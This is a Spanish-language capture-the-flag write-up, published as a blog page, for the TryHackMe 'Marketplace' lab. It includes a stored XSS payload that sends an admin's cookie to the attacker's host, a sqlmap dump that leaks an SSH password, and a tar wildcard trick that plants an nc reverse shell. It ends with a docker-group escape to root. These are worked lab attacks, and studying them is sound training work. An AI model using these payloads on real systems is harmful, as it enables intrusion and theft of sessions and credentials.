@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html><head lang="en">
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Marketplace :$%__ Tryhackme 🤖 - 0xlogs</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="¿Puedes hacerte cargo de la infraestructura de The Marketplace? " />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="Marketplace :$%__ Tryhackme 🤖" />
+<meta property="og:description" content="¿Puedes hacerte cargo de la infraestructura de The Marketplace? " />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/posts/marketplace/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-09-06T02:01:58+05:30" />
+<meta property="article:modified_time" content="2023-09-06T02:01:58+05:30" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Marketplace :$%__ Tryhackme 🤖"/>
+<meta name="twitter:description" content="¿Puedes hacerte cargo de la infraestructura de The Marketplace? "/>
+<script src="https://example.comjs/feather.min.js"></script>
+	
+	
+        <link href="https://example.com/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="https://example.com/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://example.com/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css"  disabled />
+	
+
+	
+	
+
+	
+	
+	
+	
+		
+		
+		<link rel="stylesheet" type="text/css" href="https://example.com/css/first.c90aa4ac4da9f37cbff659ce15c127d8198c776819cec0d6f2799a8585989352.css">
+		
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="https://example.com">0xlogs</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		<a href="/tags">Tags</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="https://example.comjs/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">Marketplace :$%__ Tryhackme 🤖</h1>
+			<div class="meta">Posted on Sep 6, 2023</div>
+		</div>
+		
+
+		<section class="body">
+			<h2 id="escaneo-de-puertos">Escaneo de puertos</h2>
+<p>Comencé con el escaneo de <code>nmap</code> para encontrar puertos</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nmap -sC -sV -Pn 10.10.144.119
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61🆎60:b7 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp    open  http    nginx 1.19.2
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry 
+</span></span><span style="display:flex;"><span>|_/admin
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.19.2
+</span></span><span style="display:flex;"><span>|_http-title: The Marketplace
+</span></span><span style="display:flex;"><span>32768/tcp open  http    Node.js <span style="color:#f92672">(</span>Express middleware<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry 
+</span></span><span style="display:flex;"><span>|_/admin
+</span></span><span style="display:flex;"><span>|_http-title: The Marketplace
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>miramos el sitio web ya que tiene el puerto 80 disponible</p>
+<figure><img src="https://i.imgur.com/ipsPYs3.png"/>
+</figure>
+
+<p>En la barra de navegación encontré una página de inicio de sesión, probé algunas cargas útiles de inyección SQL allí pero no funcionaron, también probé sqlmap pero no obtuve resultados, luego fui a la página de registro para registrarme, ahora usando esas credenciales puedo iniciar sesión en el sitio web.</p>
+<figure><img src="https://i.imgur.com/0WpwGrs.png"/>
+</figure>
+
+<h2 id="xss">XSS</h2>
+<p>En <code>/New listing</code> ahora podemos crear un nuevo listado. Como la sala tiene la etiqueta xss, pensé en usar una carga útil xss</p>
+<figure><img src="https://i.imgur.com/L1nqpH7.png"/>
+</figure>
+
+<p><code>y tenemos un XSS</code></p>
+<h2 id="cookie-del-administrador">Cookie del administrador</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;script&gt;document.location<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://10.2.55.245:8000/XSS/grabber.php?c=&#39;</span>+document.cookie&lt;/script&gt;
+</span></span></code></pre></div><p>Nos ponemos en escucha por el puerto 8000</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nc -nvlp <span style="color:#ae81ff">8000</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1234</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.2.55.245<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.144.119<span style="color:#f92672">]</span> <span style="color:#ae81ff">43900</span>
+</span></span><span style="display:flex;"><span>GET /bogus.php?**output<span style="color:#f92672">=</span>token<span style="color:#f92672">=</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiY3liZXIiLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTYwMzI1NTc3Mn0.XFgO3ci8vuX_vvcAOeRhducv_RFGgqttCvQuI2FwonE** HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 10.2.55.245:8000
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/83.0.4103.116 Safari/537.36
+</span></span><span style="display:flex;"><span>Accept: image/webp,image/apng,image/*,*/*;q<span style="color:#f92672">=</span>0.8
+</span></span><span style="display:flex;"><span>Referer: http://10.10.144.119/item/5
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.9
+</span></span></code></pre></div><p>Para asegurarnos de que el administrador vea este listado, le enviaremos un informe mediante la opción &ldquo;Informar listado a los administradores&rdquo;.</p>
+<p>Después de informar, recibiremos la cookie del administrador.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ nc -nvlp <span style="color:#ae81ff">8000</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8000</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.2.55.245<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.144.119<span style="color:#f92672">]</span> <span style="color:#ae81ff">33228</span>
+</span></span><span style="display:flex;"><span>GET /bogus.php?**output<span style="color:#f92672">=</span>token<span style="color:#f92672">=</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDMyNTc3Nzl9.Tt1_4wFLDydqatc32qabzzgeRiPtoVqPUGwGh6Ittcg** HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 10.2.55.245:8000
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> HeadlessChrome/85.0.4182.0 Safari/537.36
+</span></span><span style="display:flex;"><span>Accept: image/webp,image/apng,image/*,*/*;q<span style="color:#f92672">=</span>0.8
+</span></span><span style="display:flex;"><span>Referer: http://localhost:3000/item/5
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Accept-Language: en-US
+</span></span></code></pre></div><p>Ahora editamos en el panel del navegador el token/cookie y tenemos acceso al administrador</p>
+<p>al entrar al panel tenemos la primera <code>flag</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>THM{c37************************c348d5}
+</span></span></code></pre></div><h2 id="sql-injection">Sql injection</h2>
+<p>Pulsamos un usuario y accedemos a: /admin?user=1</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/admin?user=&#39;
+</span></span></code></pre></div><p>y recibimos un mensaje de error</p>
+<figure><img src="https://i.imgur.com/TEAilqy.png"/>
+</figure>
+
+<p>Usamos sqlmap obtener la db</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sqlmap --dbms<span style="color:#f92672">=</span>mysql  -u <span style="color:#e6db74">&#39;http://10.10.144.119/admin?user=2&#39;</span> -p <span style="color:#e6db74">&#39;user&#39;</span> --cookie<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDMyNTc3Nzl9.Tt1_4wFLDydqatc32qabzzgeRiPtoVqPUGwGh6Ittcg**&#34;</span> --delay<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> --dump  
+</span></span></code></pre></div><p>Obtenemos de la tabla messages esto:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>User Hello!
+</span></span><span style="display:flex;"><span>An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password.
+</span></span><span style="display:flex;"><span>Your new password is: @b_ENXkGYUCAv3zJ
+</span></span><span style="display:flex;"><span>,Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!
+</span></span><span style="display:flex;"><span>,Thank you for your report. We have been unable to review the list
+</span></span></code></pre></div><p>Aquí tenemos una posible contraseña SSH <code>@b_ENXkGYUCAv3zJ</code></p>
+<p>Probamos con el user jake</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ssh jake@10.10.144.119
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;10.10.38.49 (10.10.38.49)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:nRz0NCvN/WNh5cE3/dccxy42AXrwcJInG2n8nBWtNtg.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.38.49<span style="color:#e6db74">&#39; (ECDSA) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">jake@10.10.38.49&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 18.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-112-generic x86_64<span style="color:#f92672">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jake@the-marketplace:~$ cat user.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>THM<span style="color:#f92672">{</span>c3648************************c0b4<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h3 id="escalada-de-privilegios-michael">Escalada de privilegios Michael</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jake@the-marketplace:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> jake on the-marketplace:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User jake may run the following commands on the-marketplace:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>michael<span style="color:#f92672">)</span> NOPASSWD: /opt/backups/backup.sh
+</span></span></code></pre></div><p>Jake puede ejecutar /opt/backups/backup.sh como usuario michael</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jake@the-marketplace:~$ cat /opt/backups/backup.sh 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Backing up files...&#34;</span>;
+</span></span><span style="display:flex;"><span>tar cf /opt/backups/backup.tar *
+</span></span></code></pre></div><p>Y encontré <a href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/">esta increíble publicación</a> que explica cómo explotar el comodín en <code>tar</code> para escalar privilegios.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jake@the-marketplace:~$ cd /opt/backups/
+</span></span><span style="display:flex;"><span>jake@the-marketplace:/opt/backups$ ls
+</span></span><span style="display:flex;"><span>backup.sh  backup.tar
+</span></span><span style="display:flex;"><span>jake@the-marketplace:/opt/backups$ echo <span style="color:#e6db74">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.2.55.245 1234 &gt;/tmp/f&#34;</span> &gt; shell.sh
+</span></span><span style="display:flex;"><span>jake@the-marketplace:/opt/backups$ echo <span style="color:#e6db74">&#34;&#34;</span> &gt; <span style="color:#e6db74">&#34;--checkpoint-action=exec=sh shell.sh&#34;</span>
+</span></span><span style="display:flex;"><span>jake@the-marketplace:/opt/backups$ echo <span style="color:#e6db74">&#34;&#34;</span> &gt; --checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Ejecutamos el script</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh 
+</span></span><span style="display:flex;"><span>Backing up files...
+</span></span><span style="display:flex;"><span>tar: backup.tar: file is the archive; not dumped
+</span></span><span style="display:flex;"><span>rm: cannot remove <span style="color:#e6db74">&#39;/tmp/f&#39;</span>: No such file or directory
+</span></span></code></pre></div><p>Previamente nos colocamos en escucha en nuestra maquina local</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nc -nvlp <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1234</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.2.55.245<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.144.119<span style="color:#f92672">]</span> <span style="color:#ae81ff">36678</span>
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>michael<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>michael<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>michael<span style="color:#f92672">)</span>,999<span style="color:#f92672">(</span>docker<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Estamos en el grupo <code>Docker</code>, buscamos en <a href="https://gtfobins.github.io/gtfobins/docker/?ref=infosecarticles.com">GTFO Bins</a> y somos usuario root</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c<span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>michael@the-marketplace:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># cat root.txt</span>
+</span></span><span style="display:flex;"><span>cat root.txt
+</span></span><span style="display:flex;"><span>THM<span style="color:#f92672">{</span>d17dfe53g9*********<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span></code></pre></div>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/tryhackme">tryhackme</a></li>
+					
+					<li><a href="/tags/sqli">sqli</a></li>
+					
+					<li><a href="/tags/docker">docker</a></li>
+					
+					<li><a href="/tags/web">web</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/athul/archie" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://github.com/athulcajay/" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a><a class="soc" href="https://gitlab.com/athul/" rel="me" title="Linkedln"><i data-feather="linkedin"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2023  © eliecer_j |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
